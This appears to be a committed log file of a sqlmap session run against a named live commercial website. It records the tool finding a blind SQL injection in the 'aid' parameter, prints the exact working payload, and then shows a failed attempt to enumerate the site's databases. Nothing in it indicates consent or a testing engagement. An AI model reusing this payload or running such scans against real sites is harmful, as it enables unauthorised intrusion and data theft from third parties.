@@ -1,0 +1,77 @@
+http://www.londonpass.com/?aid=16
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.3.3.44#dev}
+|_ -| . [.]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:05:48 /2019-05-29/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[01:05:49] [INFO] testing connection to the target URL
+sqlmap got a 301 redirect to 'https://www.londonpass.com/?aid=16'. Do you want to follow? [Y/n] Y
+[01:05:50] [INFO] checking if the target is protected by some kind of WAF/IPS
+[01:05:51] [WARNING] reflective value(s) found and filtering out
+[01:05:52] [INFO] testing if the target URL content is stable
+[01:05:52] [WARNING] GET parameter 'aid' does not appear to be dynamic
+[01:05:53] [WARNING] heuristic (basic) test shows that GET parameter 'aid' might not be injectable
+[01:05:54] [INFO] heuristic (XSS) test shows that GET parameter 'aid' might be vulnerable to cross-site scripting (XSS) attacks
+[01:05:54] [INFO] testing for SQL injection on GET parameter 'aid'
+[01:05:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[01:07:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[01:08:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[01:09:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[01:10:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[01:11:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[01:11:13] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[01:11:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[01:11:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[01:12:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[01:12:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[01:13:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[01:13:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
+[01:14:16] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[01:14:49] [INFO] GET parameter 'aid' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[01:14:49] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[01:14:49] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[01:15:07] [INFO] target URL appears to be UNION injectable with 1 columns
+[01:15:09] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
+[01:15:09] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
+[01:15:31] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
+[01:15:47] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[01:16:05] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[01:16:22] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
+[01:16:41] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
+[01:16:59] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
+[01:17:18] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
+[01:17:38] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
+[01:17:58] [INFO] checking if the injection point on GET parameter 'aid' is a false positive
+[01:18:16] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
+GET parameter 'aid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 920 HTTP(s) requests:
+---
+Parameter: aid (GET)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: aid=16' RLIKE (SELECT (CASE WHEN (4192=4192) THEN 16 ELSE 0x28 END)) AND 'KryB'='KryB
+---
+[01:18:18] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL Unknown
+[01:18:18] [INFO] fetching database names
+[01:18:18] [INFO] fetching number of databases
+[01:18:18] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[01:18:18] [INFO] retrieved: 
+[01:18:22] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[01:18:22] [ERROR] unable to retrieve the number of databases
+[01:18:22] [INFO] falling back to current database
+[01:18:22] [INFO] fetching current database
+[01:18:22] [INFO] retrieved: 
+[01:20:17] [CRITICAL] unable to retrieve the database names
+[01:20:17] [INFO] fetched data logged to text files under '/root/.sqlmap/output/www.londonpass.com'
+
+[*] ending @ 01:20:17 /2019-05-29/
+
